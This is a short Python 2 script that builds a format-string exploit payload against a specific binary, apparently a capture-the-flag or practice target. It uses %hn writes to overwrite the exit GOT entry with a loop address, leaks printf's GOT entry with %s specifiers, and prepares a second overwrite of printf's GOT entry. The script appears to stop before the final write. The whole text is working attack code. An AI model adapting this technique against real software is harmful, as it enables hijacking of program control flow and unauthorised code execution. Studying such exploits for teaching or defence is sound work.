import struct

LOOP = 0x4009bd
EXIT_GOT = 0x601258
PRINTF_GOT = 0x601220

# put address of EXIT_GOT on stack
exploit = ""
exploit += "AAAABBBBCCCCDDDDEEEEFFFF"

#17$->24$
for i in range(0, 8, 1):
    exploit += struct.pack("Q", EXIT_GOT + i);
    
# write to exit got entry the value of loop pointer
exploit += "\ne "
exploit += "%2493x%17$hn"


# prep for leak of printf addr
exploit += "\n" + "AAAABBBBCCCCDDDDEEEEFFFF"*8
for i in range(0, 12, 1):
    exploit += struct.pack("Q", PRINTF_GOT + i - 4);

# leak addr of printf to console
exploit += "\ne "
for i in range(0, 8):
    exploit += "%"+str(i+39)+"$s,"
exploit += "\n"

# prep for overwrite of printf (starts at $51 for printf got addr)
exploit += "AAAABBBBCCCCDDDDEEEEFFFFGGGG"*10
for i in range(0, 10):
    exploit += struct.pack("Q", PRINTF_GOT + i - 2)

exploit += "\n"

print exploit
